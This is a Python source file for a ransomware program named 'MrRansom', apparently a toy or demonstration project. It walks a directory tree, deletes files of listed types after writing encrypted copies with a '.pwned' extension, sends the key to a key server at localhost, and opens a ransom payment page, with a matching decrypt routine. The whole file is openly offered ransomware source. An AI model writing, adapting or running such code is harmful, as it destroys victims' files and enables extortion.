import json
import os
import shutil
import webbrowser

import locksmith
from aldersonalgorithm import AldersonAlgorithm
from fileutil import get_file, put_file, get_file_bytes_e64, put_file_d64

LOCAL_DIR = os.path.dirname(os.path.realpath(__file__))

FILE_TYPES_JSON_PATH = os.path.join(LOCAL_DIR, "file_types.json")

FILE_TYPES = json.loads(get_file(FILE_TYPES_JSON_PATH))["fileTypes"]

ENCRYPTED_EXTENSION = ".pwned"

RANSOM_HTML = "mr-ransom.html"

KEY_SERVER = 'http://localhost:5000'

BLOCK_SIZE = 5


def get_files_to_process(files, should_process):
    files_to_process = []
    for file_path in files:
        if should_process(file_path):
            files_to_process.append(file_path)

    return files_to_process


def can_encrypt_file(file_path):
    for file_type in FILE_TYPES:
        if file_path.endswith(file_type) and not os.path.basename(file_path).startswith("."):
            return True


def can_decrypt_file(file_name):
    return file_name.endswith(ENCRYPTED_EXTENSION)


def get_all_files(root_dir):
    return [os.path.join(path, file_name)
            for path, directories, file_names in os.walk(root_dir)
            for file_name in file_names]


class MrRansom:

    def __init__(self, root_dir):
        self.root_dir = root_dir
        self.all_files = get_all_files(root_dir)

    def encrypt(self):
        key = locksmith.create_key()
        locksmith.export_key(KEY_SERVER, key, self.root_dir)

        for file_path in get_files_to_process(self.all_files, can_encrypt_file):
            content = get_file_bytes_e64(file_path)
            os.remove(file_path)

            encrypted = AldersonAlgorithm(key, BLOCK_SIZE).encrypt(content)

            put_file(file_path + ENCRYPTED_EXTENSION, encrypted)

            self.do_payment()

    def decrypt(self):
        key = locksmith.get_key(KEY_SERVER, self.root_dir)

        for file_path in get_files_to_process(self.all_files, can_decrypt_file):
            content = get_file(file_path)

            decrypted = AldersonAlgorithm(key, BLOCK_SIZE).decrypt(content)

            put_file_d64(file_path[:len(file_path) - len(ENCRYPTED_EXTENSION)], decrypted)
            os.remove(file_path)

            self.clear_payment()

    def do_payment(self):
        payment_location = os.path.join(LOCAL_DIR, RANSOM_HTML)
        output_location = os.path.join(self.root_dir, RANSOM_HTML)

        shutil.copyfile(payment_location, output_location)

        webbrowser.open("file://" + output_location)

    def clear_payment(self):
        os.remove(os.path.join(self.root_dir, RANSOM_HTML))
